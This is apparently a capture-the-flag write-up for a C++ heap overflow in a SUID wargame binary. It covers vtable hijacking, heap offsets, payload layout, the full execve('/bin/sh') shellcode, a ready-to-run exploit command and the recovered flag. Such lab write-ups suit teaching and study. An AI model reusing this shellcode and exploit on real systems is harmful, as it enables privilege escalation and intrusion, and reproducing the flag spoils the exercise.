# Level 9

Same recon as level0: SUID **bonus0**. C++ binary, and **NX is disabled** here (unique to this level), so code on the heap runs.

## Analysis

```cpp
class N {
    void *vtable;          // offset 0
    char  annotation[100]; // offset 4
    int   value;           // offset 104
    void setAnnotation(char *s) { memcpy(this + 4, s, strlen(s)); }  // no bound
    virtual int operator+(N &other);
};

int main(int argc, char **argv) {
    N *a = new N(5);
    N *b = new N(6);
    a->setAnnotation(argv[1]);      // overflows a's annotation
    (*b->vtable[0])(b, a);          // virtual call through b's vtable
}
```

`setAnnotation` copies `argv[1]` with no bound, so it can [overflow object a into object b](../knowledge_base/heap_overflow.md#exploit-pattern-3-c-vtable-overwrite) and overwrite b's vtable pointer. The program then makes a virtual call through that pointer.

> **vtable hijack.** To make a C++ virtual call, the program follows two pointers in a row: from the object to its vtable, then from the vtable to the function, and runs it. (A vtable is the table of a class's virtual functions.) If we control b's vtable pointer, we pick both steps and end up running our [shellcode](../knowledge_base/shellcode_injection.md).

### Heap layout

```
(gdb) b *0x08048677
(gdb) r AAAA
(gdb) x/wx $esp+0x14     -> a = 0x0804a008
(gdb) x/wx $esp+0x10     -> b = 0x0804a078
```

Distance `0x0804a078 - 0x0804a008` = `0x70` = **112 bytes**. So from a's annotation start (a+4):

```
a+4   : annotation (setAnnotation writes here)
a+108 : chunk b metadata (4 bytes)
a+112 : b.vtable pointer   <- overwrite this   (= 0x0804a078 = b+0)
```

### The virtual call

```asm
mov    0x10(%esp),%eax   ; eax = b
mov    (%eax),%eax        ; eax = *b           (vtable pointer)
mov    (%eax),%edx        ; edx = *vtable       (first function pointer)
call   *%edx              ; call it
```

Two pointer follows, so we need: `*b` = some address X, and `*X` = the shellcode address. We put both X and the shellcode inside the annotation, which we control.

## Exploit

### Shellcode (45 bytes)

Same Aleph One shellcode as level2 ([source](https://fr.wikipedia.org/wiki/Shellcode)); it sets `edx` to NULL so execve's `envp` is valid:

```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

### Payload (112 bytes)

```
offset   0..44  : shellcode                                  (lives at a+4 = 0x0804a00c)
offset  45..99  : 55 'A' padding
offset 100..103 : 0x0804a00c  -> fake vtable entry           (this slot is at a+104 = 0x0804a070)
offset 104..107 : 4 'A'       -> overwrites chunk b metadata (harmless)
offset 108..111 : 0x0804a070  -> new b.vtable pointer        (overwrites b+0)
```

Runtime chain:

```
*b               = 0x0804a070   (our vtable pointer, at a+104)
*(0x0804a070)    = 0x0804a00c   (our vtable entry)
call 0x0804a00c  -> shellcode at a+4
```

### Run

```bash
./level9 "$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*55 + "\x0c\xa0\x04\x08AAAA\x70\xa0\x04\x08"')"
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

(`\x0c\xa0\x04\x08` = 0x0804a00c, `\x70\xa0\x04\x08` = 0x0804a070, little-endian. Payload has no null bytes, so it survives as `argv[1]`.)

Flag: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
